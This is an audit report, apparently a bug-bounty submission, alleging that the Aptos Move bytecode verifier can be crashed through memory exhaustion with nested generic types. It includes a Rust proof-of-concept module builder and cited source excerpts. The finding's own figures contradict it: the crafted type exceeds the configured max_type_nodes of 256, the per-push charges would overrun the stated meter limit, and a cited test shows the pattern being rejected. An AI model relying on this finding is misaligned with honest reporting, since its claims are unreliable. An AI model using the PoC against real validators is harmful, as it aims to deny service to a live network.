# Audit Report

## Title
Bytecode Verifier Memory Exhaustion Through Type Instantiation with Logical Limits Bypass

## Summary
The Move bytecode verifier uses count-based limits (logical limits) rather than actual memory consumption limits during type safety verification. An attacker can craft bytecode with deeply nested generic types that pass all logical limit checks but cause out-of-memory (OOM) conditions during verification, crashing validator nodes before any gas is charged.

## Finding Description

The bytecode verifier's limit checks operate on **logical counts** rather than **actual memory consumption**. This creates a critical gap where type instantiation can cause exponential memory growth while staying within all configured limits. [1](#0-0) 

The tests only validate that limits reject operations exceeding count thresholds, not memory consumption.

The core vulnerability lies in the type instantiation mechanism: [2](#0-1) 

The `instantiate` function recursively clones `SignatureToken` structures. For `StructInstantiation` (which holds `Vec<SignatureToken>`), this creates new heap allocations at each recursion level without memory accounting. [3](#0-2) 

The metering system only charges based on node count, not memory: [4](#0-3) 

Production configuration uses count-based limits: [5](#0-4) 

**Attack Path:**
1. Attacker constructs a `CompiledModule` with a struct having 32 type parameters (within `max_generic_instantiation_length: 32`)
2. Each type parameter is a deeply nested type (e.g., `Vector<Vector<Vector<...>>>` with 20 levels, within `max_type_depth: 20`)
3. Bytecode uses `VecUnpack` or function calls that instantiate and push this type multiple times
4. Node count: 32 params × 20 depth = 640 nodes × TYPE_NODE_COST(30) = 19,200 units (well below 80,000,000 limit)
5. Actual memory: Each instantiation clones the entire nested structure. With `Vec<SignatureToken>` allocations at each level, a single type token can consume megabytes
6. With `max_push_size: 10000` pushes, the verifier allocates gigabytes before hitting any limit

The verification runs inside a panic handler but OOM occurs during allocation: [6](#0-5) 

## Impact Explanation

**High Severity** - This vulnerability enables:

1. **Validator Node Crashes**: Malicious transactions cause OOM during verification, crashing validator nodes before gas charging
2. **Network DoS**: Attackers can repeatedly submit such transactions to disrupt network availability
3. **No Gas Cost**: Attack occurs during verification (pre-execution), so no gas is deducted
4. **Consensus Impact**: If enough validators crash simultaneously, network liveness is threatened

This qualifies as **High Severity** per Aptos Bug Bounty criteria: "Validator node slowdowns" and "API crashes" through resource exhaustion affecting availability.

## Likelihood Explanation

**High Likelihood**:
- Attack requires only transaction submission capability (no privileged access)
- Bytecode can be crafted programmatically to maximize memory consumption while staying within limits
- The verification phase processes every transaction, making this a reliable attack vector
- No defense mechanisms exist beyond logical limits (no memory quotas during verification)
- The `big_vec_unpacks` test demonstrates similar patterns already hit limits at much smaller scales [7](#0-6) 

## Recommendation

Implement actual memory tracking during bytecode verification:

1. **Add memory budget to Meter**: Extend `BoundMeter` to track allocated bytes, not just logical units
2. **Charge for actual allocations**: In `instantiate()` and `push()`, measure `std::mem::size_of_val()` of cloned types
3. **Memory limit in VerifierConfig**: Add `max_verification_memory_bytes` (e.g., 100MB)
4. **Early termination**: Return error when memory budget exceeded before OOM occurs

Example fix for `push` function:
```rust
fn push(&mut self, meter: &mut impl Meter, ty: SignatureToken) -> PartialVMResult<()> {
    self.charge_ty(meter, &ty)?;
    // Add: charge for actual memory size
    let ty_size = calculate_signature_token_size(&ty);
    meter.add_memory(Scope::Function, ty_size)?;
    self.stack.push(ty);
    Ok(())
}
```

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
// File: third_party/move/move-bytecode-verifier/bytecode-verifier-tests/src/unit_tests/memory_exhaustion_test.rs

use move_binary_format::file_format::*;
use move_bytecode_verifier::verify_module_with_config_for_test;
use move_core_types::{account_address::AccountAddress, identifier::Identifier};

#[test]
fn test_memory_exhaustion_within_logical_limits() {
    const TYPE_DEPTH: usize = 20;
    const TYPE_PARAMS: usize = 32;
    const VEC_UNPACK_COUNT: u64 = 5000;
    
    // Build deeply nested Vector type: Vector<Vector<...Vector<U8>...>>
    let mut nested_type = SignatureToken::U8;
    for _ in 0..TYPE_DEPTH {
        nested_type = SignatureToken::Vector(Box::new(nested_type));
    }
    
    // Create type parameters vector (32 params, each deeply nested)
    let type_params = vec![
        StructTypeParameter {
            constraints: AbilitySet::EMPTY,
            is_phantom: false,
        };
        TYPE_PARAMS
    ];
    
    // Create struct instantiation with all nested types
    let struct_inst_types = vec![nested_type; TYPE_PARAMS];
    let sig_token = SignatureToken::StructInstantiation(
        StructHandleIndex(0),
        struct_inst_types,
    );
    
    // Build module with bytecode that unpacks vectors
    let mut code = vec![];
    for _ in 0..100 {
        code.push(Bytecode::CopyLoc(0));
        code.push(Bytecode::VecPack(SignatureIndex(1), 1));
        code.push(Bytecode::VecUnpack(SignatureIndex(1), VEC_UNPACK_COUNT));
    }
    for _ in 0..100 {
        code.push(Bytecode::VecPack(SignatureIndex(1), VEC_UNPACK_COUNT));
        code.push(Bytecode::Pop);
    }
    code.push(Bytecode::Ret);
    
    let module = CompiledModule {
        version: 5,
        self_module_handle_idx: ModuleHandleIndex(0),
        module_handles: vec![ModuleHandle {
            address: AddressIdentifierIndex(0),
            name: IdentifierIndex(0),
        }],
        struct_handles: vec![StructHandle {
            module: ModuleHandleIndex(0),
            name: IdentifierIndex(1),
            abilities: AbilitySet::ALL,
            type_parameters: type_params,
        }],
        function_handles: vec![FunctionHandle {
            module: ModuleHandleIndex(0),
            name: IdentifierIndex(0),
            parameters: SignatureIndex(1),
            return_: SignatureIndex(0),
            type_parameters: vec![],
            access_specifiers: None,
            attributes: vec![],
        }],
        signatures: vec![Signature(vec![]), Signature(vec![sig_token])],
        identifiers: vec![
            Identifier::new("f").unwrap(),
            Identifier::new("S").unwrap(),
        ],
        address_identifiers: vec![AccountAddress::ONE],
        constant_pool: vec![],
        metadata: vec![],
        struct_defs: vec![StructDefinition {
            struct_handle: StructHandleIndex(0),
            field_information: StructFieldInformation::Native,
        }],
        function_defs: vec![FunctionDefinition {
            function: FunctionHandleIndex(0),
            visibility: Visibility::Public,
            is_entry: true,
            acquires_global_resources: vec![],
            code: Some(CodeUnit {
                locals: SignatureIndex(0),
                code,
            }),
        }],
        field_handles: vec![],
        friend_decls: vec![],
        struct_def_instantiations: vec![],
        function_instantiations: vec![],
        field_instantiations: vec![],
        struct_variant_handles: vec![],
        struct_variant_instantiations: vec![],
        variant_field_handles: vec![],
        variant_field_instantiations: vec![],
    };
    
    let config = VerifierConfig {
        max_push_size: Some(10000),
        max_generic_instantiation_length: Some(32),
        max_type_nodes: Some(256),
        max_type_depth: Some(20),
        max_per_fun_meter_units: Some(1000 * 80000),
        ..Default::default()
    };
    
    // This will consume gigabytes of memory during verification
    // despite staying within all logical limits
    let result = verify_module_with_config_for_test(
        "memory_exhaustion",
        &config,
        &module,
    );
    
    // Expected: OOM or extreme memory consumption
    // Actual limits don't prevent this attack
    println!("Result: {:?}", result);
}
```

## Notes

While runtime execution has memory quotas (as evidenced by `MEMORY_LIMIT_EXCEEDED` errors during execution), the **bytecode verification phase** lacks equivalent protection. The vulnerability specifically affects the pre-execution verification stage where type instantiation occurs without memory bounds, allowing attackers to crash validators before any gas charges apply.

### Citations

**File:** third_party/move/move-bytecode-verifier/bytecode-verifier-tests/src/unit_tests/limit_tests.rs (L13-62)
```rust
#[test]
fn test_function_handle_type_instantiation() {
    let mut m = basic_test_module();
    m.function_handles.push(FunctionHandle {
        module: ModuleHandleIndex::new(0),
        name: IdentifierIndex::new(0),
        parameters: SignatureIndex(0),
        return_: SignatureIndex(0),
        type_parameters: std::iter::repeat_n(AbilitySet::ALL, 10).collect(),
        access_specifiers: None,
        attributes: vec![],
    });

    assert_eq!(
        LimitsVerifier::verify_module(
            &VerifierConfig {
                max_generic_instantiation_length: Some(9),
                ..Default::default()
            },
            &m
        )
        .unwrap_err()
        .major_status(),
        StatusCode::TOO_MANY_TYPE_PARAMETERS
    );

    let mut s = basic_test_script();
    s.function_handles.push(FunctionHandle {
        module: ModuleHandleIndex::new(0),
        name: IdentifierIndex::new(0),
        parameters: SignatureIndex(0),
        return_: SignatureIndex(0),
        type_parameters: std::iter::repeat_n(AbilitySet::ALL, 10).collect(),
        access_specifiers: None,
        attributes: vec![],
    });

    assert_eq!(
        LimitsVerifier::verify_script(
            &VerifierConfig {
                max_generic_instantiation_length: Some(9),
                ..Default::default()
            },
            &s
        )
        .unwrap_err()
        .major_status(),
        StatusCode::TOO_MANY_TYPE_PARAMETERS
    );
}
```

**File:** third_party/move/move-bytecode-verifier/bytecode-verifier-tests/src/unit_tests/limit_tests.rs (L181-283)
```rust
fn big_vec_unpacks() {
    const N_TYPE_PARAMS: usize = 16;
    let mut st = SignatureToken::Vector(Box::new(SignatureToken::U8));
    let type_params = vec![st; N_TYPE_PARAMS];
    st = SignatureToken::StructInstantiation(StructHandleIndex(0), type_params);
    const N_VEC_PUSH: u16 = 1000;
    let mut code = vec![];
    // 1. CopyLoc:     ...         -> ... st
    // 2. VecPack:     ... st      -> ... Vec<st>
    // 3. VecUnpack:   ... Vec<st> -> ... st, st, st, ... st
    for _ in 0..N_VEC_PUSH {
        code.push(Bytecode::CopyLoc(0));
        code.push(Bytecode::VecPack(SignatureIndex(1), 1));
        code.push(Bytecode::VecUnpack(SignatureIndex(1), 1 << 15));
    }
    // 1. VecPack:   ... st, st, st, ... st -> ... Vec<st>
    // 2. Pop:       ... Vec<st>            -> ...
    for _ in 0..N_VEC_PUSH {
        code.push(Bytecode::VecPack(SignatureIndex(1), 1 << 15));
        code.push(Bytecode::Pop);
    }
    code.push(Bytecode::Ret);
    let type_param_constraints = StructTypeParameter {
        constraints: AbilitySet::EMPTY,
        is_phantom: false,
    };
    let module = CompiledModule {
        version: 5,
        self_module_handle_idx: ModuleHandleIndex(0),
        module_handles: vec![ModuleHandle {
            address: AddressIdentifierIndex(0),
            name: IdentifierIndex(0),
        }],
        struct_handles: vec![StructHandle {
            module: ModuleHandleIndex(0),
            name: IdentifierIndex(1),
            abilities: AbilitySet::ALL,
            type_parameters: vec![type_param_constraints; N_TYPE_PARAMS],
        }],
        function_handles: vec![FunctionHandle {
            module: ModuleHandleIndex(0),
            name: IdentifierIndex(0),
            parameters: SignatureIndex(1),
            return_: SignatureIndex(0),
            type_parameters: vec![],
            access_specifiers: None,
            attributes: vec![],
        }],
        field_handles: vec![],
        friend_decls: vec![],
        struct_def_instantiations: vec![],
        function_instantiations: vec![],
        field_instantiations: vec![],
        signatures: vec![Signature(vec![]), Signature(vec![st])],
        identifiers: vec![
            Identifier::new("f").unwrap(),
            Identifier::new("generic_struct").unwrap(),
        ],
        address_identifiers: vec![AccountAddress::ONE],
        constant_pool: vec![],
        metadata: vec![],
        struct_defs: vec![StructDefinition {
            struct_handle: StructHandleIndex(0),
            field_information: StructFieldInformation::Native,
        }],
        function_defs: vec![FunctionDefinition {
            function: FunctionHandleIndex(0),
            visibility: Visibility::Public,
            is_entry: true,
            acquires_global_resources: vec![],
            code: Some(CodeUnit {
                locals: SignatureIndex(0),
                code,
            }),
        }],
        struct_variant_handles: vec![],
        struct_variant_instantiations: vec![],
        variant_field_handles: vec![],
        variant_field_instantiations: vec![],
    };

    // save module and verify that it can ser/de
    let mut mvbytes = vec![];
    module.serialize(&mut mvbytes).unwrap();
    let module = CompiledModule::deserialize(&mvbytes).unwrap();

    let res = verify_module_with_config_for_test(
        "big_vec_unpacks",
        &VerifierConfig {
            max_loop_depth: Some(5),
            max_generic_instantiation_length: Some(32),
            max_function_parameters: Some(128),
            max_basic_blocks: Some(1024),
            max_push_size: Some(10000),
            ..Default::default()
        },
        &module,
    );
    assert_eq!(
        res.unwrap_err().major_status(),
        StatusCode::VALUE_STACK_PUSH_OVERFLOW
    );
}
```

**File:** third_party/move/move-bytecode-verifier/src/type_safety.rs (L87-99)
```rust
    fn push(&mut self, meter: &mut impl Meter, ty: SignatureToken) -> PartialVMResult<()> {
        self.charge_ty(meter, &ty)?;
        self.stack.push(ty);
        Ok(())
    }

    fn charge_ty(&mut self, meter: &mut impl Meter, ty: &SignatureToken) -> PartialVMResult<()> {
        meter.add_items(
            Scope::Function,
            TYPE_NODE_COST,
            ty.preorder_traversal().count(),
        )
    }
```

**File:** third_party/move/move-bytecode-verifier/src/type_safety.rs (L1348-1389)
```rust
fn instantiate(token: &SignatureToken, subst: &Signature) -> SignatureToken {
    use SignatureToken::*;

    if subst.0.is_empty() {
        return token.clone();
    }

    let inst_vec = |v: &[SignatureToken]| -> Vec<SignatureToken> {
        v.iter().map(|ty| instantiate(ty, subst)).collect()
    };
    match token {
        Bool => Bool,
        U8 => U8,
        U16 => U16,
        U32 => U32,
        U64 => U64,
        U128 => U128,
        U256 => U256,
        I8 => I8,
        I16 => I16,
        I32 => I32,
        I64 => I64,
        I128 => I128,
        I256 => I256,
        Address => Address,
        Signer => Signer,
        Vector(ty) => Vector(Box::new(instantiate(ty, subst))),
        Function(args, result, abilities) => Function(inst_vec(args), inst_vec(result), *abilities),
        Struct(idx) => Struct(*idx),
        StructInstantiation(idx, struct_type_args) => {
            StructInstantiation(*idx, inst_vec(struct_type_args))
        },
        Reference(ty) => Reference(Box::new(instantiate(ty, subst))),
        MutableReference(ty) => MutableReference(Box::new(instantiate(ty, subst))),
        TypeParameter(idx) => {
            // Assume that the caller has previously parsed and verified the structure of the
            // file and that this guarantees that type parameter indices are always in bounds.
            debug_assert!((*idx as usize) < subst.len());
            subst.0[*idx as usize].clone()
        },
    }
}
```

**File:** third_party/move/move-binary-format/src/file_format.rs (L932-971)
```rust
pub enum SignatureToken {
    /// Boolean, `true` or `false`.
    Bool,
    /// Unsigned integers, 8 bits length.
    U8,
    /// Unsigned integers, 64 bits length.
    U64,
    /// Unsigned integers, 128 bits length.
    U128,
    /// Address, a 16 bytes immutable type.
    Address,
    /// Signer, a 16 bytes immutable type representing the capability to publish at an address
    Signer,
    /// Vector
    Vector(Box<SignatureToken>),
    /// Function, with n argument types and m result types, and an associated ability set.
    Function(Vec<SignatureToken>, Vec<SignatureToken>, AbilitySet),
    /// User defined type
    Struct(StructHandleIndex),
    StructInstantiation(StructHandleIndex, Vec<SignatureToken>),
    /// Reference to a type.
    Reference(Box<SignatureToken>),
    /// Mutable reference to a type.
    MutableReference(Box<SignatureToken>),
    /// Type parameter.
    TypeParameter(TypeParameterIndex),
    /// Unsigned integers, 16 bits length.
    U16,
    /// Unsigned integers, 32 bits length.
    U32,
    /// Unsigned integers, 256 bits length.
    U256,
    /// Signed integers
    I8,
    I16,
    I32,
    I64,
    I128,
    I256,
}
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L155-167)
```rust
    VerifierConfig {
        scope: VerificationScope::Everything,
        max_loop_depth: Some(5),
        max_generic_instantiation_length: Some(32),
        max_function_parameters: Some(128),
        max_basic_blocks: Some(1024),
        max_value_stack_size: 1024,
        max_type_nodes: if enable_function_values {
            Some(128)
        } else {
            Some(256)
        },
        max_push_size: Some(10000),
```

**File:** third_party/move/move-bytecode-verifier/src/verifier.rs (L134-173)
```rust
pub fn verify_module_with_config(config: &VerifierConfig, module: &CompiledModule) -> VMResult<()> {
    if config.verify_nothing() {
        return Ok(());
    }
    let prev_state = move_core_types::state::set_state(VMState::VERIFIER);
    let result = std::panic::catch_unwind(|| {
        // Always needs to run bound checker first as subsequent passes depend on it
        BoundsChecker::verify_module(module).map_err(|e| {
            // We can't point the error at the module, because if bounds-checking
            // failed, we cannot safely index into module's handle to itself.
            e.finish(Location::Undefined)
        })?;
        FeatureVerifier::verify_module(config, module)?;
        LimitsVerifier::verify_module(config, module)?;
        DuplicationChecker::verify_module(module)?;

        signature_v2::verify_module(config, module)?;

        InstructionConsistency::verify_module(module)?;
        constants::verify_module(module)?;
        friends::verify_module(module)?;

        RecursiveStructDefChecker::verify_module(module)?;
        InstantiationLoopChecker::verify_module(module)?;
        CodeUnitVerifier::verify_module(config, module)?;

        // Add the failpoint injection to test the catch_unwind behavior.
        fail::fail_point!("verifier-failpoint-panic");

        script_signature::verify_module(module, no_additional_script_signature_checks)
    })
    .unwrap_or_else(|_| {
        Err(
            PartialVMError::new(StatusCode::VERIFIER_INVARIANT_VIOLATION)
                .finish(Location::Undefined),
        )
    });
    move_core_types::state::set_state(prev_state);
    result
}
```
